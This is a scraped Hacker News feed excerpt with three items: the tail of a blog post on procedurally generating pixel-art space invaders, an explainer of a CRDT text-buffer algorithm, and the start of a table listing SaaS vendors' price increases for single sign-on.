href="#finding-the-root">#</a></h3><p>Since tentacles grow from the bottom, we start with the lowest side point of the body polygon. As usual, we do the left side first and mirror later.</p><h3 id="sketching-the-mid-line">Sketching the mid-line <a href="#sketching-the-mid-line">#</a></h3><p>From the lowest point, we generate a few random points to form a polyline. Its length is random, and it serves as a mid-line for the tentacle.</p><h3 id="fattening-the-line">Fattening the line <a href="#fattening-the-line">#</a></h3><p>On its own, the line is too thin. To turn it into a tentacle we need to give it width. The trick is to calculate points on both sides of the bisector line and connect them together. I like this technique and use it often for my drawings.</p><p>It feels natural that the tentacle is wider where it connects to the body and shrinks further away. To achieve this, we reduce the bisector length as we move outward.</p><p>Two notes on this "fat line" algorithm:</p><ul>
<li>Because the mid-line is random, we often get sharp corners, which create weird overlaps. To soften them we scale down the line width relative to how sharp the angle is.</li>
<li>In the generator, you'll see an easing parameter for the width. Probably overkill, but it lets me fine tune the width along the tentacle and occasionally fill a missing pixel. I liked the control, so I kept it.</li>
</ul><h3 id="our-first-tentacle">Our first tentacle <a href="#our-first-tentacle">#</a></h3><p>Connecting the bisector endpoints gives us our first fat line, or rather, our first tentacle.</p><p>Now we're ready to generate more tentacles and horns the same way.</p><h3 id="growing-more-tentacles">Growing more tentacles <a href="#growing-more-tentacles">#</a></h3><p>First we mirror the tentacle we just drew. Some invaders also have a middle tentacle. Let's <span tabindex="0" role="button">randomly decide</span><span><span><span>If the invader you are looking at hasn't grown a middle tentacle, refresh the page to get a new one.</span></span></span> if we should draw one.</p><p>For the middle tentacle we start from the bottom point of the body polygon. We draw a line just like before, but with one change - if we get close to a side tentacle we stop. This avoids overlaps that often create a blob of pixels.</p><p>To keep the middle tentacle symmetrical, we'll take the lazy route - draw it randomly and then mirror it.</p><h3 id="adding-horns">Adding horns <a href="#adding-horns">#</a></h3><p>We draw horns the same way, except we start from the central point and shoot diagonally upward. Horns use a slightly narrower angle range to avoid overlaps. As usual, draw the left one and then mirror it.</p><p>At this stage we have a very <del>crappy</del> rough vector invader. With this rough outline in place, the next challenge is turning it into the pixelated look we all know and love.</p><h2 id="turning-vectors-into-pixels">Turning vectors into pixels <a href="#turning-vectors-into-pixels">#</a></h2><p>By pixelization, I mean painting pixels on the grid based on the vector invader. My first idea was to calculate how much of each pixel lies inside the vector shape and paint it if it's over 50%. That would be the most accurate, but it felt over-engineered for such a tiny grid.</p><h3 id="pixelizing-the-body">Pixelizing the body <a href="#pixelizing-the-body">#</a></h3><p>Instead, we'll keep it simple - check if the center of a pixel is inside the polygon. If it is, paint it.</p><p>This method isn't perfectly accurate, but it's easy and more than good enough. We're drawing tiny fictional space invaders, not building a universal rasterizer.</p><h3 id="pixelizing-the-limbs">Pixelizing the limbs <a href="#pixelizing-the-limbs">#</a></h3><p>Tentacles can get thin, so often the center of a pixel won't fall inside them. That leaves only a few pixels painted. To improve this, we check if the center of a pixel is close to one of the tentacle points. If so, we paint it.</p><p>But if the points are far apart, that still leaves gaps. To improve it, I added a <code>line splitting</code> parameter that subdivides the mid-line into more segments. More points mean a higher chance that a pixel center will be near one. It is not essential, but it helps fine tune invaders you like.</p><p>Now it really looks like an invader - but it's still blind. Let's slap some eyes on it!</p><h2 id="adding-eyes">Adding eyes <a href="#adding-eyes">#</a></h2><p>We could get clever with eyes, but a few predefined sets work just fine. I already drew some, so we just select one set. We'll place the eyes near the central point, since the body is built around it.</p><p>To keep eyes from ending up on the edge, I padded the predefined sets with a few extra pixels. To <span tabindex="0" role="button">make it easier to see</span><span><span><span>Pun intended!</span></span></span>, these extra pixels are shown lighter in the animation. Finally, if eye pixels overlap with body pixels, we remove them to create holes.</p><h2 id="coloring-the-invader">Coloring the invader <a href="#coloring-the-invader">#</a></h2><p>Finally, we can apply some color and there is our invader! Let's talk about color a little.</p><p>To generate colors, I used the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/color_value/oklch">OKLCH color space</a>. It's similar to HSL, but unlike HSL it has predictable lightness. That means if we keep the lightness parameter fixed and randomly generate the other two, all generated colors share the same lightness. This is practical for many reasons, but in our case it helps us create colors of similar vibrancy for each invader.</p><p>The code looks like this:</p><pre><code><span><span>const</span> l <span>=</span> <span>random</span><span>(</span><span>0.55</span><span>,</span> <span>0.8</span><span>,</span> rng<span>,</span> <span>2</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
</span><span><span>const</span> c <span>=</span> <span>random</span><span>(</span><span>0.2</span><span>,</span> <span>0.5</span><span>,</span> rng<span>,</span> <span>2</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
</span><span><span>const</span> h <span>=</span> <span>(</span><span>random</span><span>(</span><span>120</span><span>,</span> <span>420</span><span>,</span> rng<span>,</span> <span>0</span><span>)</span> <span>%</span> <span>360</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span> <span>// skip brownish tones 60 - 120</span>
</span><span>
</span><span><span>document</span><span>.</span><span>documentElement</span><span>.</span><span>style</span><span>.</span><span>setProperty</span><span>(</span><span>'--theme-l'</span><span>,</span> l<span>)</span><span>;</span>
</span><span><span>document</span><span>.</span><span>documentElement</span><span>.</span><span>style</span><span>.</span><span>setProperty</span><span>(</span><span>'--theme-c'</span><span>,</span> c<span>)</span><span>;</span>
</span><span><span>document</span><span>.</span><span>documentElement</span><span>.</span><span>style</span><span>.</span><span>setProperty</span><span>(</span><span>'--theme-h'</span><span>,</span> h<span>)</span><span>;</span>
</span></code></pre><p>Notice that for the hue I skip the range between 60 and 120 - yellow-brownish tones I didn't like.</p><h3 id="color-tweaks-with-css">Color tweaks with CSS <a href="#color-tweaks-with-css">#</a></h3><p>One cool thing is that we can keep <code>l</code>, <code>c</code> and <code>h</code> as separate CSS variables. That makes it easy to mix and match or manipulate them with CSS <code>calc</code> method.</p><p>For example, I use this to fix lightness for controls in the generator so they always have enough contrast:</p><pre><code><span><span><span>.controls</span></span> <span>{</span>
</span><span>  <span>--controls-main</span><span>:</span> <span>oklch</span><span>(</span><span>0.6</span> <span>var</span><span>(</span><span>--theme-c</span><span>)</span> <span>var</span><span>(</span><span>--theme-h</span><span>)</span><span>)</span><span>;</span>
</span><span>  <span>--controls-main-light</span><span>:</span> <span>oklch</span><span>(</span><span>0.75</span> <span>var</span><span>(</span><span>--theme-c</span><span>)</span> <span>var</span><span>(</span><span>--theme-h</span><span>)</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span></code></pre><p>I also use it in debug mode to make tentacle and horn pixels darker and less saturated:</p><pre><code><span><span><span>.invader--debug</span> <span>.invader-pixel--l</span></span> <span>{</span>
</span><span>  <span>fill</span><span>:</span> <span>oklch</span><span>(</span><span>calc</span><span>(</span><span>var</span><span>(</span><span>--theme-l</span><span>)</span> <span>*</span> <span>0.8</span><span>)</span> <span>calc</span><span>(</span><span>var</span><span>(</span><span>--theme-c</span><span>)</span> <span>*</span> <span>0.6</span><span>)</span> <span>var</span><span>(</span><span>--theme-h</span><span>)</span><span>)</span><span>;</span>
</span><span><span>}</span>
</span></code></pre></div>
<h2 id="bringing-it-to-life">Bringing it to life <a href="#bringing-it-to-life">#</a></h2>
<p>For the animation, we'll try to mimic the original video game. The original invaders have very simple two-frame animations with tentacles and horns moving.</p>
<p>To move tentacles and horns, we clone their mid-lines and randomly shift a few end points. This gives us a variation for each tentacle and horn. Then we redraw the fat lines around them, pixelize it again, and get the second frame. To top it off and add a bit more life, we also move the eyes by one pixel.</p>
<p>Here is how it looks in action:</p>

<p>The pink lines are alternate mid-lines for tentacles and horns. In the generator, you can see this debug view by turning on both <code>animate</code> and <code>debug</code> options.</p>
<h2 id="size">Size <a href="#size">#</a></h2>
<p>I love how increasing the grid size makes the invader feel like it’s evolving or growing. The same algorithm runs, but on a larger area, which allows for more details.</p>

<p>But if we increase the size too much, the vector shape becomes more prominent and it usually doesn't look good. Occasionally you'll get something that looks like a final boss, but most of the time you end up with ridiculous crappy ones:</p>

<p>That's why I capped the size in the generator's interface to 31x31 pixels. But there is a way to increase it a bit more. If you change the URL directly you can push it up to a maximum of <a href="https://muffinman.io/invaders/#/size:25/">51x51 pixels</a>. I left this hidden feature in to show how increasing the size breaks the illusion.</p>
<h2 id="conclusion">Conclusion <a href="#conclusion">#</a></h2>
<p>We made it!</p>
<p>Thank you for sticking with me until the end. We built a generator that can create an infinite number of little colorful invaders. I'm super happy with how they turned out, and I hope you like them too.</p>
<p>Making the generator and writing the post was a lot of fun. There are still things to add and improve, but like I said earlier - I learned how to publish a project even when my TODO list isn't empty. I might add a few more things to the generator, but I've got other projects lined up, so we'll see.</p>
<p>I honestly hope you enjoyed reading the post and generating our little colorful intergalactic friends. And don't forget to <a href="https://muffinman.io/invaders/">generate your own fleet</a>.</p>
<h2 id="making-of-the-post">Making of the post <a href="#making-of-the-post">#</a></h2>
<p>I usually keep all of the JavaScript in my posts unminified so people can read the code and hack around. But in this case, the invader generator and the animation use several external dependencies, so it was easier to add a build step.</p>
<p>The animation is made with <a href="https://animejs.com/">Anime.js</a> and its code lives in the <a href="https://github.com/Stanko/invaders/blob/dev/src/drawing/step-by-step.ts">generator repository</a>. The TypeScript gets compiled and copied to my blog repo. Finally, there is a <a href="https://github.com/Stanko/Stanko.github.io/blob/brz/site/public/js/posts/invaders/index.js">small script</a> that coordinates the animation and connects it to the page scroll.</p>
<p>The animation is also available in the generator itself. If you add the <code>step</code> parameter and toggle debug mode you'll be able to <a href="https://muffinman.io/invaders/?step#/debug:true">play with it</a> there as well.</p>
<h2 id="bonus---the-rope-post">Bonus - The rope post <a href="#bonus---the-rope-post">#</a></h2>
<p>If you liked this post, check out my earlier interactive one - <a href="https://muffinman.io/blog/draw-svg-rope-using-javascript/">Draw SVG rope using JavaScript</a>. I think you'll enjoy it.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Perfect Freehand – Draw perfect pressure-sensitive freehand lines (131 pts)]]></title>
            <link>https://www.perfectfreehand.com/</link>
            <guid>44955624</guid>
            <pubDate>Tue, 19 Aug 2025 19:53:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.perfectfreehand.com/">https://www.perfectfreehand.com/</a>, See on <a href="https://news.ycombinator.com/item?id=44955624">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[CRDT: Text Buffer (123 pts)]]></title>
            <link>https://madebyevan.com/algos/crdt-text-buffer/</link>
            <guid>44955459</guid>
            <pubDate>Tue, 19 Aug 2025 19:38:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://madebyevan.com/algos/crdt-text-buffer/">https://madebyevan.com/algos/crdt-text-buffer/</a>, See on <a href="https://news.ycombinator.com/item?id=44955459">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <section>
        

  

  
  <p>
    Collaboratively editing strings of text is a common desire in peer-to-peer applications. For example, a note-taking
    app might represent each document as a single collaboratively-edited string of text.
  </p>
  <p>
    The algorithm presented here is one way to do this. It comes from a family of algorithms called
    <a href="https://en.wikipedia.org/wiki/Conflict-free_replicated_data_type">CRDTs</a>, which I will not describe
    here. It's similar to the approaches taken by popular collaborative text editing libraries such as
    <a href="https://github.com/yjs/yjs">Yjs</a> and <a href="https://github.com/automerge/automerge">Automerge</a>.
    Other articles have already been written about these similar approaches (see the
    <a href="#references">references</a> section below), but this article also has a nice interactive visualization of
    what goes on under the hood.
  </p>
  <p>
    <b><i>The algorithm:</i></b>
  </p>
  <ul>
    <li>
      <p>
        Each character is assigned a unique identifier consisting of <code>site</code> (the identifier of the creator)
        and <code>clock</code> (a site-specific integer that is incremented after every operation) as well as a
        (possibly null) <code>parent</code> pointer to a previous character.
      </p>
    </li>
    <li>
      <p>
        To insert a character, set its <code>parent</code> pointer to the character immediately before the insertion
        point at the time of insertion (or to null when inserting at the beginning). The character order is determined
        by a pre-order tree traversal that places parents before their children. This is
        <a href="https://madebyevan.com/algos/crdt-tree-based-indexing/">tree-based indexing</a>.
      </p>
    </li>
    <li>
      <p>
        To order characters with the same parent, have each character also store a <code>counter</code> value and sort
        first by <code>counter</code> (use descending order), then by the <code>site</code> of the character (use
        arbitrary but consistent order). When inserting before a character with the same parent, use its counter
        incremented by 1 to be ordered before it. This order is unique because doing this means the same site will never
        reuse the same counter in the same spot.
      </p>
    </li>
    <li>
      <p>
        To delete a character, put that character's identifier in a deleted set. Note that this means deleted characters
        persist forever, which is known as a "tombstone" in CRDT literature. Deleted character values can be forgotten
        but the positions must be remembered to be able to correctly order incoming changes that use one of the
        now-deleted characters as a parent.
      </p>
    </li>
  </ul>
  <p>
    This is not as expensive as it sounds because of three important optimizations:
  </p>
  <ul>
    <li>
      <p>
        Successive inserts from the same site can all be merged into a single block in memory, so for example pasting a
        large chunk of text uses the same amount of metadata as inserting a single character. This works because
        character identifiers are carefully designed to be able to be implicit in a contiguous run of text (each
        character will the same <code>site</code> and <code>counter</code> and have a <code>clock</code> that's 1 more
        than the previous character's <code>clock</code>).
      </p>
    </li>
    <li>
      <p>
        These blocks of memory can be stored contiguously in a single array that's pre-sorted in document order.
        Inserting a new block just involves inserting into that array at the correct position. This avoids needing to
        store the tree data structure explicitly (e.g. with arrays of children and/or sibling pointers) and also takes
        advantage of CPU optimizations for reading memory sequentially.
      </p>
    </li>
    <li>
      <p>
        The delete set can be represented more efficiently using a range-based representation. A series of deletes with
        the same <code>site</code> and with consecutive <code>clock</code> values can be represented with a single
        range. Note that this range is contiguous in identifier-space but not necessarily in document-space.
      </p>
    </li>
  </ul>
  <p>
    Below is a demo of what this looks like in practice. Each quadrant represents a peer, and peers send messages to
    each other with a simulated network delay. Click on a peer's text to edit it. Temporarily disable the simulated
    network with the pause button to construct simultaneous editing scenarios. You can use your browser's "view source"
    feature to view the <a href="https://madebyevan.com/algos/crdt-text-buffer/crdt-text-buffer.js">source code for this demo</a>.
  </p>

  </section>
  
  <section>

    <p>
      This technique has the following benefits and drawbacks:
    </p>
    <p>
      <b>Benefits:</b>
    </p>
    <ul>
      <li>
        <p>Memory usage: The metadata overhead needed to track collaborative edits is reasonable and is also likely to
          compress well as it contains runs of similar values.</p>
      </li>
      <li>
        <p>Performance: It's possible to implement most of the queries and/or updates to the data structure in O(log n)
          time using either binary trees or arrays with binary search.</p>
      </li>
    </ul>
    <p>
      <b>Drawbacks:</b>
    </p>
    <ul>
      <li>
        <p>Complexity: The logic for splitting and merging is complicated and hard to implement correctly. Fuzz testing
          is likely essential for a correct implementation.</p>
      </li>
      <li>
        <p>Grow-only: Deleting data does not reduce the size of the metadata. Addressing this properly is quite
          challenging as it involves coordinating between peers to ensure data is only removed when it's no longer
          needed by any peer in the system. It also can break down when a peer goes offline and never comes back online,
          but the system supports peers being offline for arbitrary lengths of time. This algorithm does not attempt to
          address that problem.</p>
      </li>
    </ul>

    <p>
      <b id="references">References:</b>
    </p>
    <p>
      Here are some excellent resources on CRDT text buffers that I found helpful when implementing this algorithm:
    </p>
    <ul>
      <li>
        <a href="https://josephg.com/blog/crdts-go-brrr/">https://josephg.com/blog/crdts-go-brrr/</a>
        <p>Talks about how to implement text-based CRDTs efficiently. Covers some of the optimizations used here
          including storing runs of text together and storing insertions in a flat list.</p>
      </li>
      <li>
        <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a>
        <p>Goes over tree-based indexing (which it calls "causal trees") in a lot of depth. Discusses a possible
          approach to distributed garbage collection as well as the complexities that come with it. Has lots of
          additional references at the bottom.</p>
      </li>
      <li>
        <a href="https://www.bartoszsypytkowski.com/yrs-architecture/">https://www.bartoszsypytkowski.com/yrs-architecture/</a>
        <p>Goes over the internals of Yjs in more detail, which is relevant because what I implemented is similar to
          what Yjs does. Some high-level differences are that a) Yjs doesn't store delete sets explicitly and sends all
          of them all over again each time syncing starts and b) Yjs gives each insert an additional rightward pointer
          for resolving ordering between children with the same parent.</p>
      </li>
      <li>
        <a href="https://www.inkandswitch.com/peritext/">https://www.inkandswitch.com/peritext/</a>
        <p>"Rich text" involves attaching formatting attributes (e.g. bold or italic) to individual characters. Doing
          this in a collaborative environment requires careful algorithm to preserve the original human intention after
          an automatic merge. This article presents a way to do that.</p>
      </li>
    </ul>

    
    
    

      </section>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Vendors that treat single sign-on as a luxury feature (265 pts)]]></title>
            <link>https://sso.tax/</link>
            <guid>44955457</guid>
            <pubDate>Tue, 19 Aug 2025 19:38:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sso.tax/">https://sso.tax/</a>, See on <a href="https://news.ycombinator.com/item?id=44955457">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content" role="main">
      

<details open="">
  <summary>
    <p>Why does this exist?</p>
  </summary>
  <p>Single sign-on (SSO) is a mechanism for outsourcing the authentication for your website (or other product) to a third party identity provider, such as Google, Okta, Entra ID (Azure AD), PingFederate, etc.</p>

  <p>In this context, SSO refers to a SaaS or similar vendor allowing a business client to manage user accounts via the client’s own identity provider, without having to rely on the vendor to provide strong authentication with audit logs, and with the ability to create and delete user accounts centrally, for all users, across all software in use by that client.</p>

  <p>For organizations with more than a handful of employees, this feature is critical for IT and Security teams to be able to effectively manage user accounts across dozens or hundreds of vendors, many of which don’t support features like TOTP 2FA or U2F. In the event that an employee leaves the company, it allows the IT team to immediately disable their access to all applications, rather than logging into 100 different user management portals.</p>

  <p>In short: SSO is a core security requirement for any company with more than five employees.</p>

  <p>SaaS vendors appear not to have received this message, however. SSO is often only available as part of “Enterprise” pricing, which assumes either a huge number of users (minimum seat count) or is force-bundled with other “Enterprise” features which may have no value to the company using the software.</p>

  <p>If companies claim to “take your security seriously”, then SSO should be available as a feature that is either:</p>

  <ol>
    <li>part of the core product, or</li>
    <li>an optional paid extra for a reasonable delta, or</li>
    <li>attached to a price tier, but with a reasonably small gap between the non-SSO tier and SSO tiers.</li>
  </ol>

  <p>Many vendors charge 2x, 3x, or 4x the base product pricing for access to SSO, which disincentivizes its use and encourages poor security practices.</p>
</details>

<h2 id="the-list">The List</h2>

<table>
<thead>
<tr><th>Vendor</th><th>Base Pricing</th><th>SSO Pricing</th><th>% Increase</th><th>Source</th><th>Date Updated</th></tr>
</thead>
<tbody>

<tr>
<td><a href="https://www.adobe.com/">Adobe Acrobat Pro</a></td>
<td>$23.99</td>
<td>$27.99</td>
<td>17%</td>
<td>


<a href="https://www.adobe.com/acrobat/pricing/business.html">🔗</a>

</td>
<td>2023-07-18</td>
</tr>

<tr>
<td><a href="https://www.adobe.com/">Adobe Creative Cloud</a></td>
<td>$84.99</td>
<td>$140.99</td>
<td>66%</td>
<td>


<a href="https://www.adobe.com/creativecloud/business-plans.html">🔗</a>

</td>
<td>2023-07-18</td>
</tr>

<tr>
<td><a href="https://airtable.com/">Airtable</a></td>
<td>$10 per u/m</td>
<td>$60 per u/m</td>
<td>500%</td>
<td>


<a href="https://airtable.com/pricing">🔗</a>

Quote</td>
<td>2019-10-19</td>
</tr>

<tr>
<td><a href="https://www.appsmith.com/">Appsmith</a></td>
<td>$15 per u/m</td>
<td>$2500<sup id="fnref:appsmith-price" role="doc-noteref"><a href="#fn:appsmith-price" rel="footnote">1</a></sup></td>
<td>16567%</td>
<td>


<a href="https://www.appsmith.com/pricing">🔗</a>

</td>
<td>2025-06-04</td>
</tr>

<tr>
<td><a href="https://asana.com/">Asana</a></td>
<td>$25 per u/m</td>
<td>$60 per u/m<sup id="fnref:asana-price" role="doc-noteref"><a href="#fn:asana-price" rel="footnote">2</a></sup></td>
<td>140%</td>
<td>


<a href="https://asana.com/pricing">🔗</a>

Quote</td>
<td>2020-12-09</td>
</tr>

<tr>
<td><a href="https://www.atlassian.com/">Atlassian (Jira Cloud)</a></td>
<td>$7.75 per u/m</td>
<td>$11.75 per u/m<sup id="fnref:jira-price" role="doc-noteref"><a href="#fn:jira-price" rel="footnote">3</a></sup></td>
<td>51%</td>
<td>


<a href="https://www.atlassian.com/software/access/pricing">🔗</a>

</td>
<td>2023-09-22</td>
</tr>

<tr>
<td><a href="https://balsamiq.com/">Balsamiq Wireframes</a></td>
<td>$9 per month</td>
<td>$14 per month</td>
<td>56%</td>
<td>


<a href="https://balsamiq.com/buy">🔗</a>

</td>
<td>2024-07-28</td>
</tr>

<tr>
<td><a href="https://bitwarden.com/">BitWarden</a></td>
<td>$4 per u/m</td>
<td>$6 per u/m</td>
<td>50%</td>
<td>


<a href="https://bitwarden.com/pricing/business">🔗</a>

</td>
<td>2024-08-28</td>
</tr>

<tr>
<td><a href="https://www.bitrise.io/">Bitrise</a></td>
<td>$90</td>
<td>$270</td>
<td>200%</td>
<td>


<a href="https://www.bitrise.io/pricing/teams">🔗</a>

</td>
<td>2019-06-25</td>
</tr>

<tr>
<td><a href="https://www.box.com/">Box</a></td>
<td>$5 per u/m</td>
<td>$15 per u/m</td>
<td>200%</td>
<td>


<a href="https://www.box.com/pricing">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://breezy.hr/">Breezy HR</a></td>
<td>$171 per month</td>
<td>$1500 per month<sup id="fnref:breezyhr-price" role="doc-noteref"><a href="#fn:breezyhr-price" rel="footnote">4</a></sup></td>
<td>777%</td>
<td>


<a href="https://breezy.hr/pricing">🔗</a>

Quote</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="">Calendly</a></td>
<td>$12 per u/m</td>
<td>$25 per u/m</td>
<td>108%</td>
<td>


<a href="https://www.calendly.com/pricing">🔗</a>

Quote</td>
<td>2022-03-03</td>
</tr>

<tr>
<td><a href="https://canva.com/">Canva</a></td>
<td>$10 per u/m<sup id="fnref:canva" role="doc-noteref"><a href="#fn:canva" rel="footnote">5</a></sup></td>
<td>$40 per u/m<sup id="fnref:canva:1" role="doc-noteref"><a href="#fn:canva" rel="footnote">5</a></sup></td>
<td>300%<sup id="fnref:canva:2" role="doc-noteref"><a href="#fn:canva" rel="footnote">5</a></sup></td>
<td>


<a href="https://www.canva.com/pricing/">🔗</a>

Quote</td>
<td>2024-06-17</td>
</tr>

<tr>
<td><a href="https://clockify.me/">Clockify</a></td>
<td>$3.99 per u/m</td>
<td>$11.99 per u/m</td>
<td>300%</td>
<td>


<a href="https://clockify.me/extra-features">🔗</a>

</td>
<td>2021-03-17</td>
</tr>

<tr>
<td><a href="https://cloudflare.com/">Cloudflare</a></td>
<td>$20 per d/m</td>
<td>$1000 per d/m<sup id="fnref:cloudflare-price" role="doc-noteref"><a href="#fn:cloudflare-price" rel="footnote">6</a></sup></td>
<td>4900%</td>
<td>


<a href="https://www.cloudflare.com/plans/">🔗</a>

Quote</td>
<td>2023-11-23</td>
</tr>

<tr>
<td><a href="https://copper.com/">Copper CRM</a></td>
<td>$49 per u/m</td>
<td>$119 per u/m</td>
<td>143%</td>
<td>


<a href="https://copper.com/pricing">🔗</a>

</td>
<td>2019-07-31</td>
</tr>

<tr>
<td><a href="">Coursera</a></td>
<td>$399 per u/y</td>
<td>$49875 per year<sup id="fnref:coursera" role="doc-noteref"><a href="#fn:coursera" rel="footnote">7</a></sup></td>
<td>12400%</td>
<td>


<a href="https://www.coursera.org/business/compare-plans">🔗</a>

</td>
<td>2023-10-22</td>
</tr>

<tr>
<td><a href="https://www.cypress.io/">Cypress.io</a></td>
<td>$75 per month</td>
<td>$300 per month</td>
<td>300%</td>
<td>


<a href="https://www.cypress.io/pricing#monthly">🔗</a>

</td>
<td>2023-10-31</td>
</tr>

<tr>
<td><a href="https://datocms.com/">DatoCMS</a></td>
<td>$100 per month</td>
<td>$667 per month</td>
<td>567%</td>
<td>


<a href="https://www.datocms.com/pricing">🔗</a>

Quote</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://deepl.com/">DeepL Translator</a></td>
<td>$10.49 per u/m</td>
<td>$34.49 per u/m</td>
<td>229%</td>
<td>


<a href="https://www.deepl.com/pro">🔗</a>

</td>
<td>2023-10-22</td>
</tr>

<tr>
<td><a href="https://dmarcian.com/">Dmarcian</a></td>
<td>$240/mo</td>
<td>$600/mo</td>
<td>150%</td>
<td>


<a href="https://dmarcian.com/pricing/">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://www.docker.com/">Docker</a></td>
<td>$9 per u/m</td>
<td>$24 per u/m</td>
<td>167%</td>
<td>


<a href="https://www.docker.com/pricing">🔗</a>

</td>
<td>2023-10-16</td>
</tr>

<tr>
<td><a href="https://www.docusign.com/">DocuSign</a></td>
<td>$25 per u/m</td>
<td>$50 per u/m</td>
<td>100%</td>
<td>


<a href="https://www.docusign.com/products-and-pricing">🔗</a>

Quote</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://www.dropbox.com/">Dropbox</a></td>
<td>$20 per u/m</td>
<td>$26 per u/m</td>
<td>30%</td>
<td>


<a href="https://www.dropbox.com/business/plans-comparison">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://elastic.co/">Elastic</a></td>
<td>$0.2992<sup id="fnref:elastic-note" role="doc-noteref"><a href="#fn:elastic-note" rel="footnote">8</a></sup></td>
<td>$0.3429</td>
<td>15%</td>
<td>


<a href="https://www.elastic.co/subscriptions">🔗</a>

</td>
<td>2021-02-12</td>
</tr>

<tr>
<td><a href="https://envoy.com/">Envoy</a></td>
<td>$99 per location/m</td>
<td>$299 per location/m</td>
<td>202%</td>
<td>


<a href="https://envoy.com/pricing/">🔗</a>

</td>
<td>2020-02-17</td>
</tr>

<tr>
<td><a href="https://www.expensify.com/">Expensify</a></td>
<td>$5 per u/m</td>
<td>$9 per u/m</td>
<td>80%</td>
<td>


<a href="https://www.expensify.com/pricing#features">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://www.figma.com/">Figma</a></td>
<td>$12 per u/m</td>
<td>$45 per u/m</td>
<td>275%</td>
<td>


<a href="https://www.figma.com/pricing">🔗</a>

</td>
<td>2019-10-19</td>
</tr>

<tr>
<td><a href="https://www.front.com/">Front</a></td>
<td>$19 per u/m</td>
<td>$99 per u/m</td>
<td>421%</td>
<td>


<a href="https://front.com/pricing">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://www.gitbook.com/">GitBook</a></td>
<td>$8 per u/m</td>
<td>$15 per u/m<sup id="fnref:gitbook-price" role="doc-noteref"><a href="#fn:gitbook-price" rel="footnote">9</a></sup></td>
<td>87.5%</td>
<td>


<a href="https://www.gitbook.com/pricing">🔗</a>

</td>
<td>2024-05-09</td>
</tr>

<tr>
<td><a href="https://www.github.com/">GitHub</a></td>
<td>$4 per u/m</td>
<td>$21 per u/m</td>
<td>425%</td>
<td>


<a href="https://github.com/pricing">🔗</a>

</td>
<td>2020-04-14</td>
</tr>

<tr>
<td><a href="https://www.hotjar.com/">Hotjar Observe</a></td>
<td>$39 per month</td>
<td>$213 per moth</td>
<td>446%</td>
<td>


<a href="https://www.hotjar.com/pricing/">🔗</a>

</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://www.hubspot.com/">Hubspot Marketing</a></td>
<td>$46 per month</td>
<td>$2944 per month</td>
<td>6300%</td>
<td>


<a href="https://www.hubspot.com/pricing/marketing">🔗</a>

</td>
<td>2018-11-23</td>
</tr>

<tr>
<td><a href="https://inedo.com/">Inedo (ProGet)</a></td>
<td>$1995 per year</td>
<td>$9995 per year</td>
<td>400%</td>
<td>


<a href="https://inedo.com/proget/pricing">🔗</a>

</td>
<td>2024-07-02</td>
</tr>

<tr>
<td><a href="https://www.intercom.com/">Intercom</a></td>
<td>$29</td>
<td>$132</td>
<td>355%</td>
<td>


<a href="https://www.intercom.com/pricing">🔗</a>

</td>
<td>2024-08-26</td>
</tr>

<tr>
<td><a href="https://jfrog.com/">JFrog</a></td>
<td>$98/mo</td>
<td>$699/mo<sup id="fnref:jfrog" role="doc-noteref"><a href="#fn:jfrog" rel="footnote">10</a></sup></td>
<td>613%</td>
<td>


<a href="https://jfrog.com/pricing/">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://www.keepersecurity.com/">Keeper Password Manager</a></td>
<td>$2 per u/m</td>
<td>$5 per u/m</td>
<td>150%</td>
<td>


<a href="https://www.keepersecurity.com/pricing/business-and-enterprise.html">🔗</a>

Quote</td>
<td>2023-10-16</td>
</tr>

<tr>
<td><a href="https://launchdarkly.com/">LaunchDarkly</a></td>
<td>$65 per u/m</td>
<td>$125 per u/m</td>
<td>92%</td>
<td>


<a href="https://launchdarkly.com/pricing/">🔗</a>

Quote</td>
<td>2020-01-24</td>
</tr>

<tr>
<td><a href="https://www.linear.app/">Linear</a></td>
<td>$10 per u/m</td>
<td>$15 per u/m</td>
<td>50%</td>
<td>


<a href="https://linear.app/pricing">🔗</a>

</td>
<td>2022-06-09</td>
</tr>

<tr>
<td><a href="https://www.liveagent.com/">LiveAgent</a></td>
<td>$9 per u/m</td>
<td>$49 per u/m</td>
<td>444%</td>
<td>


<a href="https://www.liveagent.com/pricing/">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://logrocket.com/">LogRocket</a></td>
<td>$99 per mo</td>
<td>$350 per mo<sup id="fnref:logrocket" role="doc-noteref"><a href="#fn:logrocket" rel="footnote">11</a></sup></td>
<td>254%</td>
<td>


<a href="https://logrocket.com/pricing">🔗</a>

</td>
<td>2024-01-12</td>
</tr>

<tr>
<td><a href="https://www.loom.com/">Loom</a></td>
<td>$12.50 per u/m</td>
<td>$45 per u/m</td>
<td>260%</td>
<td>


<a href="https://www.loom.com/pricing">🔗</a>

Quote</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://www.lucidchart.com/">Lucidchart</a></td>
<td>$9 per u/m</td>
